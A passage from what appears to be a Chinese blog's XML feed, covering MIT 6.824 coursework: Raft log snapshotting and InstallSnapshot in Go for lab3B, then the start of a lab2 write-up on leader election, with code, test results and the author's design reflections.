&emsp;&emsp;为什么需要判断快照是否是最新呢？这是因为一条日志的大小可能是几十字节，并且通常一次性会交付几十条指令（占几百字节），而由于交付数据一直占用rf.mu导致无法快照，所以快照需要提前进行。这就造成一种情况，假如底层raft连续交付100条指令，可能后面50条指令都会引发快照，由于goroutine执行顺序的不确定性，新快照可能会在旧快照之前执行，所以需要忽略旧的快照指令。 leader发送快照当leader发现某个follower对应的nextIndex小于等于rf.lastIncludedIndex时，表明这个follower所需要的日志已经被leader丢弃，此时leader发送快照。在我的实现中，统一在发送心跳前判断是否需要快照，并且仅仅在这里发送快照，日志缺失或者不匹配时，并不会立即发送快照，而是修改相应的nextIndex变量。123456789101112131415161718192021go func(server int) &#123; for &#123; rf.mu.Lock() if !rf.checkState(Leader, curTerm) &#123; //已经不是leader了 rf.mu.Unlock() return &#125; //脱离集群很久的follower回来，nextIndex已经被快照了 //先判断nextIndex是否大于rf.lastIncludedIndex next := rf.nextIndex[server] if next &lt;= rf.lastIncludedIndex&#123; //注意，此时持有rf.mu锁 rf.sendSnapshot(server) return &#125; //正常发送心跳or同步日志 &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051func (rf *Raft) sendSnapshot(server int) &#123; InfoKV.Printf("Raft:%2d term:%3d | Leader send snapshot&#123;index:%4d term:%4d&#125; to follower %2d\n", rf.me, rf.currentTerm, rf.lastIncludedIndex, rf.lastIncludedTerm, server) //leader发送快照逻辑 //进来时拥有rf.mu.lock //只在一个地方进来 arg := InstallSnapshotArgs&#123; rf.currentTerm, rf.me, rf.lastIncludedIndex, rf.lastIncludedTerm, rf.persister.ReadSnapshot(), &#125; rf.mu.Unlock() repCh := make(chan struct&#123;&#125;) reply := InstallSnapshotReply&#123;&#125; //用goroutine进行RPC调用，免得阻塞主线程 go func() &#123; if ok := rf.peers[server].Call("Raft.InstallSnapshot", &amp;arg, &amp;reply); ok&#123; repCh &lt;- struct&#123;&#125;&#123;&#125; &#125; &#125;() select&#123; case &lt;- time.After(RPC_CALL_TIMEOUT): InfoKV.Printf("Raft:%2d term:%3d | Timeout! Leader send snapshot to follower %2d failed\n", rf.me, rf.currentTerm, server) return case &lt;- repCh: &#125; rf.mu.Lock() defer rf.mu.Unlock() if reply.Term &gt; rf.currentTerm&#123; //follower的term比自己大 rf.currentTerm = reply.Term rf.convertRoleTo(Follower) return &#125; if !rf.checkState(Leader, arg.Term)&#123; //rpc回来后不再是leader return &#125; //快照发送成功 rf.nextIndex[server] = arg.LastIncludedIndex + 1 rf.matchIndex[server] = arg.LastIncludedIndex //InfoKV.Printf("Raft:%2d term:%3d | OK! Leader send snapshot to follower %2d\n", rf.me, rf.currentTerm, server)&#125; InstallSnapshot逻辑follower接收到来自leader的快照后，进行如下操作： 判断leader的快照是否比自己的新 如果接受快照的是leader，转为follwer 截断日志并且保留未执行日志 修改rf.lastIncludedIndex、rf.lastIncludedTerm、rf.lastApplied、rf.lastCommitIndex 持久化新快照和rf各变量状态 给上层server发送快照信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162type InstallSnapshotArgs struct &#123; Term int //leader's term LeaaderId int LastIncludedIndex int LastIncludedTerm int Data []byte //snapshot&#125;type InstallSnapshotReply struct&#123; Term int&#125;func (rf *Raft) InstallSnapshot(args *InstallSnapshotArgs, reply *InstallSnapshotReply)&#123; InfoKV.Printf("Raft:%2d term:%3d | receive snapshot from leader:%2d ", rf.me, rf.currentTerm, args.LeaaderId) rf.mu.Lock() defer rf.mu.Unlock() reply.Term = rf.currentTerm if rf.currentTerm &gt; args.Term || args.LastIncludedIndex &lt;= rf.lastIncludedIndex&#123; InfoKV.Printf("Raft:%2d term:%3d | stale snapshot from leader:%2d | me:&#123;index%4d term%4d&#125; leader:&#123;index%4d term%4d&#125;", rf.me, rf.currentTerm, args.LeaaderId, rf.lastIncludedIndex, rf.lastIncludedTerm, args.LastIncludedIndex, args.LastIncludedTerm) return &#125; //InfoKV.Printf("Raft:%2d term:%3d | install snapshot from leader:%2d ", rf.me, rf.currentTerm, args.LeaaderId) if args.Term &gt; rf.currentTerm&#123; rf.currentTerm = args.Term rf.convertRoleTo(Follower) &#125; rf.dropAndSet(rf.appendCh) logs := make([]Entries, 0) if args.LastIncludedIndex &lt;= rf.getLastLogIndex() &#123; logs = append(logs, rf.logs[rf.subIdx(args.LastIncludedIndex):]...) &#125;else&#123; logs = append(logs, Entries&#123;args.LastIncludedTerm,args.LastIncludedIndex,-1&#125;) &#125; rf.logs = logs rf.lastIncludedIndex = args.LastIncludedIndex rf.lastIncludedTerm = args.LastIncludedTerm //记得修改这两个 rf.lastApplied = max(rf.lastIncludedIndex, rf.lastApplied) rf.commitIndex = max(rf.lastIncludedIndex, rf.commitIndex) rf.persistStateAndSnapshot(args.Data) msg := ApplyMsg&#123; false, args.Data, rf.lastIncludedIndex, rf.lastIncludedTerm, rf.role, &#125; rf.applyCh &lt;- msg InfoKV.Printf("Raft:%2d term:%3d | Install snapshot Done!\n", rf.me, rf.currentTerm)&#125; 修改日志同步的代码&emsp;&emsp;引入rf.lastIncludedIndex后，将会修改获取日志的方式，因此，需要修改leader发送心跳信息和follower接收到心跳信息的逻辑，这一部分因个人实现不同，我就不贴代码了，有兴趣的可以点这里 结果&emsp;&emsp;不知道为什么，我的时间比官方要求多得多。。其他实验都好好的，真是奇怪。而且官方截图，2000多条指令花了0.4s，我这里3909条指令花了80s，也不知道是为什么。&emsp;&emsp;另外，最后一个测试偶尔会出现死锁，测试了大概30次出现一次，但是重现环境有点麻烦，就没管了。&emsp;&emsp;还有一点，最后一个测试偶尔会报“日志没有修剪”的错误，和上面提到的原因一样，底层raft一次性提交了过多的日志，使得kvservice来不及快照，程序就结束了。这个我也没什么好办法解决，就酱吧。123456789101112131415161718 Test: InstallSnapshot RPC (3B) ... ... Passed -- 8.9 3 1948 63 Test: snapshot size is reasonable (3B) ... ... Passed -- 80.9 3 3909 800 Test: restarts, snapshots, one client (3B) ... ... Passed -- 19.6 5 6760 150 Test: restarts, snapshots, many clients (3B) ... ... Passed -- 25.4 5 13237 3000 Test: unreliable net, snapshots, many clients (3B) ... ... Passed -- 17.2 5 2030 517 Test: unreliable net, restarts, snapshots, many clients (3B) ... ... Passed -- 22.0 5 3082 529 Test: unreliable net, restarts, partitions, snapshots, many clients (3B) ... ... Passed -- 27.8 5 2876 253 Test: unreliable net, restarts, partitions, snapshots, many clients, linearizability checks (3B) ... ... Passed -- 26.2 7 7023 622 PASSok kvraft 227.821s 小结&emsp;&emsp;lab3B的挑战在于，引入日志压缩后日志下标的计算，什么时候该用日志编号（永远递增不会减小），什么时候该用在本机中存储的日志下标(日志编号-rf.lastIncludedIndex)，需要好好思考。&emsp;&emsp;此外，接收快照时需要修改的变量太多了，容易遗漏，特别是lastApplied和commitIndex。当涉及到变量修改时，最好看着rf拥有的字段来写，思考这一步操作对这一个字段会产生什么影响，这样就可以尽量避免遗漏。&emsp;&emsp;在实现中，上层server每执行一条指令，就判断是否需要发起快照。然而如果某个leader脱离集群，然后疯狂接收指令，日志疯狂增加，但是由于脱离集群无法同步指令，也就无法交付指令，因此上层server不会促发快照，导致日志会无限增长。关于这一点，我们需要思考一下，快照的目的是什么？快照的目的是节点宕机后快速恢复数据以及减少日志同步的时间，简而言之，快照保存的都是已经同步到超半数节点并且已经执行的指令！然而对于这一种情况，由于不能交付信息，所以上层servr的数据库并没有更改，所以如果根据rf接收日志长度而不是rf交付日志长度来快照的话，后面的快照和之前的快照是一样的，但有一个好处是可以减少日志占用的内存。问题是快照的同时会修改rf.lastIncludedIndex，这样一来，当这个旧leader回到集群时，新leader如果没有旧leader这么多日志，就不能发送快照给旧leader了，当然，只要修改一下判别条件，快照与否不仅仅是判断lastIncludedIndex,同时也判断lastIncludedTerm即可。不过有点麻烦，就没写了。 总结&emsp;&emsp;在lab3中，遇到了许多锁的问题，在多线程环境下，有些锁的出现猝不及防，一个良好的日志系统（不是同步的日志，而是打印输出的日志）能帮助我们快速定位到出错的地方。然而日志并不是越多越好，应该在哪些地方输出日志、日志应该输出什么内容、日志包含哪些标记有助于后续筛选，这都需要设计者去权衡。日志输出的多了，不好找引起错误的日志；日志输出少了，不好定位错误的位置，很难复盘诱发错误的场景。将日志分级，比如info、warn、error，可以区分问题的程度，后续只需要关注级别更严重的日志；此外，不同层输出不同的日志有助于日志解耦，比如raft一个单独的日志，kv一个单独的日志，这样查起错来更加简便，能快速定位问题所在。 &emsp;&emsp;一些简单但是后续会修改的操作应该集成写成函数调用。比如lab3B中的日志压缩，压缩后会修改日志下标的计算方式，如果lab2中用普通的方式（logs[i]这种）来获取日志下标，等到lab3B将会改的非常之痛苦，而且你也不能确保没有遗漏。最好的方法，就是将获取日志的方式，包括获取nextIndex，获取prevLogIndex,获取当前日志的对应下标i=index-rf.lastIncludedIndex,写成函数，这样只需要修改函数就能修改所有获取日志的方式，简洁方便，扩展性强。同理还有各种常数参数的设定，比如RPC等待超时时间等等，在文件开始用const设置，一改都改，舒服。 &emsp;&emsp;和lab2不同，lab3更多的是需要自己去设计框架，设计交互的方式和时机，设计命令执行的逻辑流程。因为lab2中的主要内容，包括leader选举、角色变换、日志复制等都在论文中有详细的讨论，我们只需要将文字翻译成代码就可以了。而lab3，更多的是需要自己去设计对应的函数，去思考client发送指令的逻辑是怎样的，server又是如何处理从client发来的指令，又应该何时修改键值数据库，lab3A特别容易引起死锁，在这里调试了很久。至于lab3B，快照的时机、快照的内容、快照对底层raft日志的影响都是需要仔细斟酌思考的要点。特别是快照引起日志截断后，raft管理日志的处理方式是重中之重，因为这会涉及到leader选举、日志同步等问题，较为复杂，在这里修改了很久。 &emsp;&emsp;除此之外，将较为复杂的函数只放到一个地方执行也是一个非常好的编程习惯，比如Leader发送快照(InstallSnapshot)的时机。由于发送快照牵一发而动全身，会改变太多东西，所以尽可能的在一个地方发送快照。当遇到需要发送快照的场景，比如follower需要的日志已经被leader丢弃时，并不是直接发送快照，而是设置相应的条件，统一在一个位置经过判断发送快照（在实现中，在发送正常心跳之前，通过判断nextIndex来确定是否发送快照）。这样的好处在于代码维护性更高，可读性更强，而且易于调试，便于管理。这样一来，当可能是快照出问题时，很容易找到错误的地方，重现诱发错误的条件，修改相应的bug。而如若是多个地方都有可能发送快照，特别是在多线程环境下，找起bug来简直痛苦。 &emsp;&emsp;Lab2和Lab3合在一起就是一个简易的分布式键值数据库，这是一个很好的例子，向我们展示了优秀设计的重要性。在本实验中，将指令执行(lab3)和日志同步(lab2)解耦，在编写代码时，更容易聚焦于当前阶段所关注的问题，而不用去思考上下层对自己的影响。这样的实现方式更模块化，方便功能扩展。]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIT6.824-lab2-raft]]></title>
    <url>%2F2019%2F06%2F04%2FMIT6-824-lab2-raft%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;MIT6.824第二个实验，实现著名的分布式一致性算法Raft，包括leader选举、日志复制和状态持久化，不包括成员变更。下面仔细分析一下实验要求,顺便分享一下我的解题思路。 lab2A-Leader election概览&emsp;&emsp;2A部分要求实现leader选举，共有两个test，一个是集群启动时选出leader，一个是在leader网络分区后，剩下的大多数节点能选举出新的leader。我先自己实现了一遍，通过了测试，然而感觉代码很糟。参考了网上一些解题思路，重构了一遍代码，最后发现每个人的思路都有一种惯性，重构之后发现代码和重构之前差不多。与其说是重构代码，不如说是梳理一遍思路。第一次实现的时候完全就是拆东墙补西墙，对代码逻辑缺乏整体的认识，而重构的时候思路如海飞丝一样丝滑顺畅，可以清晰的把握函数的跳转，状态的变迁，代码的走向，对leader election会有一种更宏观的理解。建议大家第一次实现之后重构一下，花费的时间也不会很多，但是收获觉得不少。 实验要求 在raft.go里完善requestVoteArgs和RequestVoteReply两个数据结构。 完成Make()创建raft实例，和RequestVote请求投票两个方法。 定义一个AppendEntries rpc struct，完成AppendEntries 的 Rpc调用。 为entries定义一个struct 实验提示 心跳信号周期要求一秒10次。 要求在5秒内完成一次leader election，包含检测到leader失效、多次选举的时间。 election timeout时间应该大于150ms~300ms，但是也要保证能在5s内完成选举。（注：150ms~300ms是建立在心跳信号在150ms内发送多次的情况，而这里心跳信号100ms才发送一次。）4。 记住，只要大写的struct和field才能在不同文件之间调用。所以RPC调用的struct必须是大写的。 打log有好处，方便debug，util.go里的DPrintf非常有用。 投票和日志复制要放在单独一个goroutine里，因为程序只需要绝大多数follower回复即可，不需要等待所有follower的回复。 Log entries从1开始，commitIndex 和 lastApplied从0开始，方便根据PrelogIndex同步leader和follower的日志。 新的leader通过appendEntries来告诉和他一起竞争的candidate，他成为新leader了。 日志里的内容command是int型。 实验分析&emsp;&emsp;首先分享重构之后的代码思路。&emsp;&emsp;在分析代码之前，首先要明确整个测试环境的流程。只有明白是系统怎么测试的，才能在错误中找到正确的解决方向。整体的运行逻辑如下： 设立一个控制整个网络流的net server，调度raft之间的信息交流、日志复制，同时管束所有的流量，模拟message到不了、丢失、延迟、返回丢失、机器宕机等情况。 clientEnd可以看成是一个个在集群中可用的机器节点，方便net server管制。 在每个节点上创建raft对象，每个raft对象可以是leader,candidate,follower三种身份之一。并且rpc调用，调用的是raft对象里的方法。Net server负责传递信息，clientEnd负责发送信息和接收信息。从网络协议来看，raft是应用层，clientEnd是传输层，net 是网络层。 整个流程：先创立net server，然后建立一个个clientEnd，相当于是启动机器，然后创建 raft对象，相当于是在每个机器上创建raft实例，然后根据raft的field和method，模拟raft分布式一致性算法。所以一个raft实例在创立时，就知道其他peer，也就是其他机器（clientEnd）的地址是什么了。 实验代码参数定义123456789101112131415161718192021222324252627282930313233343536373839404142434445type Entries struct&#123; Term int //该日志所属的Term Command interface&#123;&#125;&#125;//// A Go object implementing a single Raft peer.////每一个raft peer都叫server，然后分为leader,candidate,follower三种角色，但是内部的状态都是一样的type Raft struct &#123; mu sync.Mutex // Lock to protect shared access to this peer's state peers []*labrpc.ClientEnd // RPC end points of all peers persister *Persister // Object to hold this peer's persisted state me int // this peer's index into peers[] // Your data here (2A, 2B, 2C). // Look at the paper's Figure 2 for a description of what // state a Raft server must maintain. role string //Leader or candidate or follower //int32固定格式进行persist currentTerm int //该server属于哪个term votedFor int //代表所投的server的下标,初始化为-1,表示本follower的选票还在，没有投票给其他人 votedThisTerm int //判断rf.votedFor是在哪一轮承认的leader，防止一个节点同一轮投票给多个candidate logEntries []Entries //保存执行的命令，下标从1开始 commitIndex int //最后一个提交的日志，下标从0开始 lastApplied int //最后一个应用到状态机的日志，下标从0开始 //leader独有，每一次election后重新初始化 nextIndex []int //保存发给每个follower的下一条日志下标。初始为leader最后一条日志下标+1 matchIndex []int //对于每个follower，已知的最后一条与该follower同步的日志，初始化为0。也相当于follower最后一条commit的日志 appendCh chan *AppendEntriesArgs //用于follower判断在election timeout时间内有没有收到心跳信号 voteCh chan *RequestVoteArgs //投票后重启定时器 applyCh chan ApplyMsg //每commit一个log，就执行这个日志的命令，在实验中，执行命令=给applyCh发送信息 log bool //是否输出这一个raft实例的log,若为false则不输出，相当于这个实例“死了” electionTimeout *time.Timer //选举时间定时器 heartBeat int //心跳时间定时器&#125; Leader&emsp;&emsp;整个实验最重要的规划好每个角色的流程，包括何时成为这个角色？成为这个角色后需要做什么？何时从这个角色切换到其他角色？切换的条件是什么？仔细理清楚每个角色在raft中发挥的作用，是实现这个算法的关键。&emsp;&emsp;就lab2A，对于leader而言，其逻辑大致如下： 只有在一轮选举出，获得超半数票数的candidate才能成为新的leader。 按照心跳周期（这里要求一秒发十次），给所有节点发出心跳信息。 接到更高term leader的心跳信息，转为follower。 append返回的term高于自己的term，转为follower。 由于是看完论文才写实验，所以在实现2A时，难免会实现一些日志复制的内容，不过总体上来说是可以通过2A测试的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293func (rf *Raft)leader()&#123; rf.mu.Lock() curLogLen := len(rf.logEntries) - 1 //记录成为leader时的term，防止被后面的操作修改 curTerm := rf.currentTerm rf.mu.Unlock() for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; rf.nextIndex[followerId] = curLogLen + 1 rf.matchIndex[followerId] = 0 &#125; for&#123; commitFlag := true //超半数commit只通知一次管道 commitNum := 1 commitL := sync.Mutex&#123;&#125; //广播消息 for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; //每一个节点的请求参数都不一样 rf.mu.Lock() newEntries := make([]Entries, 0) //leader发送的term应该是创建goroutine时的term //否则考虑LeaderA term1给followerB term1发送第一次消息，然而延迟，B没收到消息，超时 //B变成candidate，term=2发送选票 //此时A已经停了一个心跳的时间，已经开启了给B发的第二次goroutine，但是还未执行 //A投票给B,并且term=2，此时A变成follower //然而由于发送消息是并发goroutine，A变为follower不会停止这个goroutine的执行。 // 如果用rf.currentTerm,此时A的term为2，执行第二个发送给B消息的goroutine。 //candidate B收到了来自term相同的leader的消息，变为follower。 //解决就是A和B同时变成了follower。 appendArgs := &amp;AppendEntriesArgs&#123;curTerm, rf.me, rf.nextIndex[followerId]-1, rf.logEntries[rf.nextIndex[followerId]-1].Term, newEntries, rf.commitIndex&#125; rf.mu.Unlock() go func(server int) &#123; reply := &amp;AppendEntriesReply&#123;&#125; DPrintf(rf.log, "info", "me:%2d term:%3d | leader send message to %3d\n", rf.me, curTerm, server) if ok := rf.peers[server].Call("Raft.AppendEntries", appendArgs, reply); ok&#123; rf.mu.Lock() if rf.currentTerm != curTerm&#123; //如果server当前的term不等于发送信息时的term //表明这是一条过期的信息，不要了 rf.mu.Unlock() return &#125; rf.mu.Unlock() if reply.Success&#123; commitL.Lock() commitNum = commitNum + 1 if commitFlag &amp;&amp; commitNum &gt; len(rf.peers)/2&#123; commitFlag = true commitL.Unlock() //执行commit成功的操作 &#125;else&#123; commitL.Unlock() &#125; &#125;else&#123; //append失败 rf.mu.Lock() if reply.Term &gt; curTerm&#123; //返回的term比发送信息时leader的term还要大 rf.currentTerm = reply.Term rf.mu.Unlock() rf.changeRole(Follower) &#125;else&#123; //prevLogIndex or prevLogTerm不匹配 rf.nextIndex[server] = rf.nextIndex[server] - 1 rf.mu.Unlock() &#125; &#125; &#125; &#125;(followerId) &#125; select &#123; case &lt;- rf.appendCh: rf.changeRole(Follower) return case &lt;- rf.voteCh: rf.changeRole(Follower) return case &lt;- time.After(time.Duration(rf.heartBeat) * time.Millisecond): //do nothing &#125; &#125;&#125; candidatecandidate的逻辑如下： follower超时成为candidate。 candidate获得超半数机器确认，升为leader。 投票给更高term的candidate。 接收leader的心跳信息，并且转为follower。 定时器超时，重新投票 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162func (rf *Raft)candidate()&#123; rf.mu.Lock() //candidate term已经在changeRole里+1了 //发给每个节点的请求参数都是一样的。 rf.votedFor = rf.me logLen := len(rf.logEntries) - 1 requestArgs := &amp;RequestVoteArgs&#123;rf.currentTerm, rf.me, logLen, rf.logEntries[logLen].Term&#125; rf.mu.Unlock() voteCnt := 1 //获得的选票，自己肯定是投给自己啦 voteFlag := true //收到过半选票时管道只通知一次 voteOK := make(chan bool) //收到过半选票 voteL := sync.Mutex&#123;&#125; rf.resetTimeout() for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; go func(server int) &#123; reply := &amp;RequestVoteReply&#123;&#125; if ok := rf.sendRequestVote(server, requestArgs, reply); ok&#123; //ok仅仅代表得到回复， //ok==false代表本次发送的消息丢失，或者是回复的信息丢失 if reply.VoteGranted&#123; //收到投票 voteL.Lock() voteCnt = voteCnt + 1 if voteFlag &amp;&amp; voteCnt &gt; len(rf.peers)/2&#123; voteFlag = false voteL.Unlock() voteOK &lt;- true &#125;else&#123; voteL.Unlock() &#125; &#125; &#125; &#125;(followerId) &#125; select &#123; case args := &lt;- rf.appendCh: //收到心跳信息 DPrintf(rf.log, "info", "me:%2d term:%3d | receive heartbeat from leader %3d\n", rf.me, rf.currentTerm, args.LeaderId) rf.changeRole(Follower) return case args := &lt;-rf.voteCh: //投票给某人 DPrintf(rf.log, "warn", "me:%2d term:%3d | role:%12s vote to candidate %3d\n", rf.me, rf.currentTerm, rf.role, args.CandidateId) rf.changeRole(Follower) return case &lt;- voteOK: rf.changeRole(Leader) return case &lt;- rf.electionTimeout.C: //超时 DPrintf(rf.log, "warn", "me:%2d term:%3d | candidate timeout!\n", rf.me, rf.currentTerm) rf.changeRole(Follower) return &#125;&#125; followerfollower负责响应leader和candidate，以及等待定时器超时。 收到leader的心跳信息，重启定时器。 投票给candidate，重启定时器。 定时器超时，转为candidate。 123456789101112131415161718func (rf *Raft)follower()&#123; for&#123; rf.resetTimeout() select &#123; case args := &lt;- rf.appendCh: //收到心跳信息 DPrintf(rf.log, "info", "me:%2d term:%3d | receive heartbeat from leader %3d\n", rf.me, rf.currentTerm, args.LeaderId) case args := &lt;-rf.voteCh: //投票给某人 DPrintf(rf.log, "warn", "me:%2d term:%3d | role:%12s vote to candidate %3d\n", rf.me, rf.currentTerm, rf.role, args.CandidateId) case &lt;- rf.electionTimeout.C: //超时 DPrintf(rf.log, "warn", "me:%2d term:%3d | follower timeout!\n", rf.me, rf.currentTerm) rf.changeRole(Candidate) return &#125; &#125;&#125; 整体流程&emsp;&emsp;本实验是使用goroutien来模拟多机环境，所以每个实例创建后，需要放在一个goroutine里运行，假装新建了一个节点，防止阻塞主程序。&emsp;&emsp;我的思路是实现一个无限循环的主程序run()，用于在切换角色后通过switch调动相应的函数，执行符合角色的功能。然后另写一了一个切换角色的函数changeRole,方便我打log。 初始化参数1234567891011121314151617181920212223242526272829303132333435363738394041424344func Make(peers []*labrpc.ClientEnd, me int, persister *Persister, applyCh chan ApplyMsg) *Raft &#123; rf := &amp;Raft&#123;&#125; rf.peers = peers rf.persister = persister rf.me = me // Your initialization code here (2A, 2B, 2C). rf.currentTerm = -1 rf.votedFor = -1 rf.role = Follower //log下标从1开始，0是占位符，没有意义 rf.logEntries = make([]Entries, 1) //term为-1,表示第一个leader的term编号是0,test只接受int型的command rf.logEntries[0] = Entries&#123;-1, -1&#125; rf.commitIndex = 0 rf.lastApplied = 0 rf.nextIndex = make([]int, len(peers)) rf.matchIndex = make([]int, len(peers)) rf.appendCh = make(chan *AppendEntriesArgs) rf.voteCh = make(chan *RequestVoteArgs) rf.log = true //要加这个，每次的rand才会不一样 rand.Seed(time.Now().UnixNano()) //心跳间隔：rf.heartBeat * time.Millisecond rf.heartBeat = 100 DPrintf(rf.log, "info", "Create a new server:[%3d]! term:[%3d]\n", rf.me,rf.currentTerm) //主程序负责创建raft实例、收发消息、模拟网络环境 //每个势力在不同的goroutine里运行，模拟多台机器 go rf.run() // initialize from state persisted before a crash rf.readPersist(persister.ReadRaftState()) return rf&#125; 主程序123456789101112func (rf *Raft) run()&#123; for&#123; switch rf.role&#123; case Leader: rf.leader() case Candidate: rf.candidate() case Follower: rf.follower() &#125; &#125;&#125; 修改角色1234567891011121314func (rf *Raft)changeRole(role string)&#123; switch role &#123; case Leader: DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to Leader!\n", rf.me, rf.currentTerm, rf.role) rf.role = Leader case Candidate: rf.currentTerm = rf.currentTerm + 1 DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to candidate!\n", rf.me, rf.currentTerm, rf.role) rf.role = Candidate case Follower: DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to follower!\n", rf.me, rf.currentTerm, rf.role) rf.role = Follower &#125;&#125; 辅助函数–log&emsp;&emsp;在raft文件夹下，有一个util.go文件，里面提供了一个打log的函数，非常有用，方便查看。我稍稍修改了一下，将log分为info、warn、error三等，分别保存在不同的文件夹里，方便查看。与此同时，参考网上的实现，在每个log前面加上rf.me，通过筛选，就能快速找到属于每个节点的log。并且我还加了一个变量rf.log，用来控制是否输出本节点的log，当节点被调用kill()删除时，只是系统假装删除了，本质上还在，还会输出log，所以我在kill()里将rf.log设为false，通过关闭log来假装这个节点被删掉了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package raftimport "log"import "os"import "io"// Debuggingconst Debug = 1var ( Info *log.Logger Warn *log.Logger Error *log.Logger)//初始化logfunc init()&#123; infoFile, err := os.OpenFile("info.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666) if err != nil&#123; log.Fatalln("Open infoFile failed.\n", err) &#125; warnFile, err := os.OpenFile("warn.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666) if err != nil&#123; log.Fatalln("Open warnFile failed.\n", err) &#125; errFile, err := os.OpenFile("err.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666) if err != nil&#123; log.Fatalln("Open warnFile failed.\n", err) &#125; //log.Lshortfile打印出错的函数位置 Info = log.New(io.MultiWriter(os.Stderr, infoFile), "Info:", log.Ldate | log.Ltime | log.Lshortfile) Warn = log.New(io.MultiWriter(os.Stderr, warnFile), "Warn:", log.Ldate | log.Ltime | log.Lshortfile) Error = log.New(io.MultiWriter(os.Stderr, errFile), "Error:", log.Ldate | log.Ltime | log.Lshortfile)&#125;func DPrintf(show bool, level string, format string, a ...interface&#123;&#125;) (n int, err error) &#123; if Debug == 0&#123; return &#125; if show == false&#123; //是否打印当前raft实例的log return &#125; if level == "info"&#123; Info.Printf(format, a...) &#125;else if level == "warn"&#123; Warn.Printf(format, a...) &#125;else&#123; Error.Fatalln("log error!") &#125; return&#125; requestVote 请求vote的term &lt; currentTem =&gt; false。 收到更高term的投票：判断args的日志是否比当前节点新，若是则更改自己的votefor，提升自己的term，=&gt;true，若不是，则不提升自己的term=&gt;false。 1.2.保证只有投票后才会提升自己的term，换言之，在一次选举中，一个节点只会投票给一个candidate，当一个节点的term等于请求投票的candidate的term时，代表本节点在这一轮选举中已经投过票了。 123456789101112131415161718192021222324//这里是站在接收者follower的角度写的//实现接收者接到一个请求投票时的逻辑func (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) &#123; // Your code here (2A, 2B). rf.mu.Lock() defer rf.mu.Unlock() if rf.currentTerm &gt; args.Term&#123; reply.Term = rf.currentTerm reply.VoteGranted = false &#125; if rf.currentTerm &lt; args.Term&#123; curLogLen := len(rf.logEntries)-1 if args.LastLogIndex &gt;= curLogLen &amp;&amp; args.LastLogTerm &gt;= rf.logEntries[curLogLen].Term&#123; rf.votedFor = args.CandidateId rf.currentTerm = args.Term reply.Term = rf.currentTerm reply.VoteGranted = true go func() &#123;rf.voteCh &lt;- args&#125;() &#125; &#125;&#125; AppendEntries args的term &lt; 收到新的follower的term=&gt;false。 来到这里，代表args的term大于等于当前follower的term。如果args的term&gt;follower的term，那么修改follower的term，并且同步日志；如果args的term==follower的term，那么也是需要同步日志。如果接收者是旧leader呢？也是需要同步日志，所以旧leader的判断放在最后。 同步日志：如果follower的日志小于args的日志，或者follower在arg.prevlogindex处的日志和arg不符，返回false，并且更新两个参数，以方便快速匹配吻合的日志。如果是旧leader，即便是同步日志失败，也要将旧leader转化为follower，以免存在两个follower。 来到这里，代表follower的日志长度大于等于args.prevlogindex，并且在prevlogindex及之前的日志都是匹配的。那么，删掉follower过长的日志，添加entries的日志。 判断收到AppendEntries的是否是过期的leader，若是，则转为follower。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//leader调用follower的AppendEntries RPC服务//站在follower角度完成下面这个RPC调用func (rf *Raft) AppendEntries(args *AppendEntriesArgs, reply *AppendEntriesReply) &#123; //follower收到leader的信息 rf.mu.Lock() defer rf.mu.Unlock() if args.Term &lt; rf.currentTerm &#123; reply.Term = rf.currentTerm reply.Success = false return &#125; //args.Term &gt;= rf.currentTerm //logEntries从下标1开始，log.Entries[0]是占位符 //所以真实日志长度需要-1 curLogLength := len(rf.logEntries) - 1 log_less := curLogLength &lt; args.PrevLogIndex //接收者日志大于等于leader发来的日志 且 之前已经接收过日志 且 日志项不匹配 log_dismatch := !log_less &amp;&amp; args.PrevLogIndex &gt; 0 &amp;&amp; rf.logEntries[args.PrevLogIndex].Term != args.PrevLogTerm if log_less || log_dismatch &#123; reply.Term = rf.currentTerm reply.Success = false DPrintf(rf.log, "info", "me:%2d term:%3d | receive leader:[%3d] message but not match!\n", rf.me, rf.currentTerm, args.LeaderId) &#125; else &#123; //接收者的日志大于等于prevlogindex rf.currentTerm = args.Term reply.Success = true //修改日志长度 //找到接收者和leader（如果有）第一个不相同的日志 leng := min(curLogLength-args.PrevLogIndex, len(args.Entries)) i := 0 for ; i &lt; leng; i++ &#123; if rf.logEntries[args.PrevLogIndex+i+1].Term != args.Entries[i].Term &#123; rf.logEntries = rf.logEntries[:args.PrevLogIndex+i+1] break &#125; &#125; if i != len(args.Entries) &#123; rf.logEntries = append(rf.logEntries, args.Entries[i:]...) &#125; //修改commitIndex if args.LeaderCommit &gt; rf.commitIndex &#123; rf.commitIndex = min(args.LeaderCommit, len(rf.logEntries)-1) &#125; DPrintf(rf.log, "info", "me:%2d term:%3d | receive new entries from leader:%3d, size:%3d\n", rf.me, rf.currentTerm, args.LeaderId, len(args.Entries)) &#125; //即便日志不匹配，但是也算是接收到了来自leader的日志。 go func() &#123; rf.appendCh &lt;- args &#125;()&#125; 获取随机时间123456789101112131415161718//获取随机时间，用于选举func (rf *Raft) randTime()int&#123; basicTime := 400 randNum := 150 //随机时间：basicTime + rand.Intn(randNum) timeout := basicTime + rand.Intn(randNum) return timeout&#125;//重置定时器func (rf *Raft) resetTimeout()&#123; if rf.electionTimeout == nil&#123; rf.electionTimeout = time.NewTimer(time.Duration(rf.randTime()) * time.Millisecond) 